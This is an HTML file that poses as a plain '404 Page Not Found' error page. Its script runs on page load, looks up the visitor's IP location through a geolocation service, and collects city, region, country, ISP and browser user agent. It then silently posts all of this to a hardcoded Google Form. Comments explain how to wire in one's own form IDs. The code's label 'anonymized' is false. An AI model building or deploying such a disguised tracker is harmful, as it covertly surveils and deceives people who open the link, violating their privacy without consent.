<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>404 Not Found</title>
    <!-- Load Tailwind CSS -->
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Inter', sans-serif;
            background-color: #f7f7f7;
        }
    </style>
</head>
<body class="min-h-screen flex items-center justify-center p-4">

    <!-- Error Card (Now simulating a generic HTTP error) -->
    <div id="error-card" class="w-full max-w-lg bg-white p-8 md:p-10 rounded-xl shadow-2xl border-t-8 border-gray-400 transition-all duration-300 transform scale-100 text-center">
        
        <div class="mb-8">
            <p class="text-8xl font-black text-gray-400 mb-2">404</p>
            <h1 class="text-3xl font-extrabold text-gray-800">PAGE NOT FOUND</h1>
        </div>

        <p class="text-lg text-gray-600 mb-6">
            The requested resource or document link could not be located on this server.
        </p>
        
        <p class="text-sm text-gray-500 mb-8">
            Please check the address and try again, or navigate back to the previous application.
        </p>

        <!-- The logging status message is minimal and purely technical -->
        <div id="data-status" class="space-y-2 text-xs text-gray-400 pt-4 border-t border-gray-100">
            <p>Connection attempt logged (Status Code: 404)</p>
        </div>
        
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', fetchAndLogGeolocation);

        // --- CONFIGURATION REQUIRED: REPLACE XXXXXXXXXX VALUES WITH YOUR GOOGLE FORM IDs ---
        // INSTRUCTIONS: 
        // 1. Submit a test entry to your live Google Form.
        // 2. Open Developer Tools (F12) -> Network tab -> find the POST request to /formResponse.
        // 3. Find the Request URL (FORM_POST_URL) and the unique entry IDs in the Payload tab.
        
        const FORM_POST_URL = 'https://docs.google.com/forms/u/0/d/e/1FAIpQLSd1px3RJauZh3wBrxzcoSE7nvDJiYhcSWiL2cu4DPd2fWOwiw/formResponse'; 
        const FIELD_LOCATION = 'entry.967144979'; // Example: Replace with your Form\'s entry ID for location
        const FIELD_NETWORK = 'entry.597752602';  // Example: Replace with your Form\'s entry ID for network
        const FIELD_DEVICE = 'entry.23100953';   // Example: Replace with your Form\'s entry ID for user-agent
        
        // Geolocation API Endpoint (Free, hosted, no key needed)
        const GEO_API_URL = 'https://ipapi.co/json/';
        
        // Function to fetch geolocation and log it persistently
        async function fetchAndLogGeolocation() {
            try {
                // 1. Fetch IP and Location data
                const response = await fetch(GEO_API_URL);
                if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
                const data = await response.json();

                // 2. Prepare Anonymized Log Data
                // The location data is formatted as City, Region, Country for easy parsing later.
                const locationText = data.city && data.region ? 
                    `${data.city}, ${data.region}, ${data.country_name}` : 
                    (data.country_name || 'Unknown Location');
                
                const logData = {
                    [FIELD_LOCATION]: locationText,
                    [FIELD_NETWORK]: data.org || data.asn || 'N/A', // Captures ISP or ASN
                    [FIELD_DEVICE]: navigator.userAgent || 'Unknown User Agent',
                };
                
                // 3. Log the data to the Google Form (Persistent Storage)
                await sendLogToForm(logData);

            } catch (error) {
                console.error("Error during fetch or log:", error);
                // The user sees the 404 page, and the logging attempt completes regardless.
            }
        }

        // Function to send data to the Google Form endpoint using a silent POST request
        async function sendLogToForm(logData) {
            const formData = new URLSearchParams();
            for (const key in logData) {
                formData.append(key, logData[key]);
            }

            try {
                // We use mode: 'no-cors' which is necessary for silent submission to Google Forms 
                // without waiting for a complex response or triggering cross-domain security issues.
                await fetch(FORM_POST_URL, {
                    method: 'POST',
                    body: formData,
                    mode: 'no-cors' 
                });
                console.log('Anonymized location log process completed.');

            } catch (error) {
                console.error('Failed to log data to Google Form:', error);
            }
        }
        
    </script>
</body>
</html>
